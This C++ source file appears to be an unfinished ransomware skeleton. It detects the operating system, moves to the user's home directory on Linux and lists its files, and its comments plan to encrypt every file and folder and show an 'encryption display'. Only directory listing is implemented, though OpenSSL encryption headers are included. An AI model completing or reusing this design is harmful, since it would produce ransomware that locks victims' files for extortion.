// including the header files 
#include <iostream>
#include <string>
#include <unistd.h>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <errno.h>
#include <filesystem>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include "headers/checkOperatingSystem.h"


// Running the main script 
int main() {
	// Creating the operating system variable 
	std::string operatingSystem; 

	// Getting the operating system 
	operatingSystem = checkOperatingSystem(); 

	// if the operating system is linux 
	if (operatingSystem == "linux") {
		// Execute this block of code if the operating system is linux 
		// Setting the root directory 
		const char* homeDir = getenv("HOME"); 

		// Checking if the home directory exists in the env 
		if (homeDir == nullptr) {
			// Error getting the home directory 
			std::cerr << "Error retriving the home directory. " << std::endl; 
		} 

		// Go to the root directory
		if (chdir(homeDir) != 0) {
			std::cerr << "Error changing directory: " << strerror(errno) << std::endl; 

		}  

		// else if the navigation was successfull 
		else {
			// Execute this block of code if the navigation was a success 
			// print the working directory 
			char currentDir[1024]; 

			// Get the current working directory 
			if (getcwd(currentDir, sizeof(currentDir)) != nullptr) {
				// printing the current working directory 
				std::cout << "Current working directory: " << currentDir << std::endl;

				// Get the current path 
				std::filesystem::path currentPath = std::filesystem::current_path(); 

				// Iterate through the current directory 
				for (const auto& entry : std::filesystem::directory_iterator(currentPath)) {
					std::cout << entry.path().filename() << std::endl; 

				} 

			}

			else {
				// Error getting the current working directory 
				std::cerr << "Error getting the current directory: " << strerror(errno) << std::endl; 
			}
		}
		// Ilertate through all the files in the root directory 
		// encrypt the files and folders 
		// launch the gui encryption display 
	}

	// else if the operating system is windows 
	else if (operatingSystem == "windows") {
		// Execute this block of code if the operating system is windows 
	}

	// if the operating systems is unknown, pass 
	if (operatingSystem == "unknown") {
		// Execute this block of code if the operating system is unknown. 

	}


	// closing up 
	return 0; 
}